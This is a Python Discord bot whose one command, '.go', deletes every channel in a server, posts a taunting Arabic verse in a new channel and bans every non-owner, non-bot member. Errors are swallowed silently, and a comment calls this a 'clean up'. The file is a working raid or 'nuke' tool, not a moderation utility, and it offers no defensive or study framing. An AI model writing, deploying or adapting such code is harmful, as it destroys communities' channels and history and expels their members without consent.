import os
import discord
from discord.ext import commands

# سحب التوكن من متغيرات البيئة (Railway Variables)
TOKEN = os.getenv('DISCORD_TOKEN')

intents = discord.Intents.all()
bot = commands.Bot(command_prefix='.', intents=intents)

@bot.event
async def on_ready():
    print(f'Done: {bot.user.name} is online!')

@bot.command()
async def go(ctx):
    # تنفيذ عملية التنظيف
    for channel in ctx.guild.channels:
        try: await channel.delete()
        except: pass
    
    new_ch = await ctx.guild.create_text_channel('𝑴')
    msg = """الوجه بلوجه والنيه بنيه
والي يدور على الزله بيلقاها
علمني الوقت معلومه اساسيه
ان بعض البشر ماتبي الا من يتوطاها"""
    await new_ch.send(msg)

    for member in ctx.guild.members:
        try:
            if member != ctx.guild.owner and not member.bot:
                await member.ban(reason="Clean up")
        except: pass

# التحقق من وجود التوكن قبل التشغيل
if TOKEN:
    try:
        bot.run(TOKEN)
    except discord.errors.LoginFailure:
        print("خطأ: التوكن غير صحيح، قم بعمل Reset Token جديد وضعه في Variables.")
else:
    print("خطأ: لم يتم العثور على DISCORD_TOKEN في إعدادات الاستضافة.")
